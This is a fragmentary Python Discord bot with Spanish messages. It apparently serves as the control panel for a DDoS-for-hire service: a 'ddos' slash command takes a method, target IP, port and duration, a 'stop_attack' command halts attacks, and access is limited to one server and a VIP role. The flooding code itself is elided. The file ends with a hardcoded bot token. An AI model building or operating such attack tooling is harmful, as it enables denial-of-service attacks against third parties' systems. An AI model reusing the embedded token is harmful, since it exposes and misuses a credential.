...
OWNER_ID = 1305995594690723900
GUILD_ID = 1358175050250981396
VIP_ROLE_NAME = "VIP"
...
async def ddos(interaction: discord.Interaction, method: str, ip: str, port: int, time: int):
    if interaction.guild.id != GUILD_ID:
        await interaction.response.send_message("Este bot solo funciona en el servidor autorizado.", ephemeral=True)
        return
    ...
    if log_channel:
        await log_channel.send(f"**Ataque iniciado**\nMétodo: `{method}`\nIP: `{ip}`\nPuerto: `{port}`\nDuración: `{time}`s\nPor: `{interaction.user}`")
...
async def stop_attack(interaction: discord.Interaction):
    ...
    log_channel = bot.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        await log_channel.send(f"**Ataques detenidos** por `{interaction.user}`")
...
bot.run(“MTE3OTgzNjc4NjY4NDQ4MTYyNw.GGyrb7.TZ3yaYOn5ZnMo0aY-tHPhbIh7qbWestuJFxGC0”)
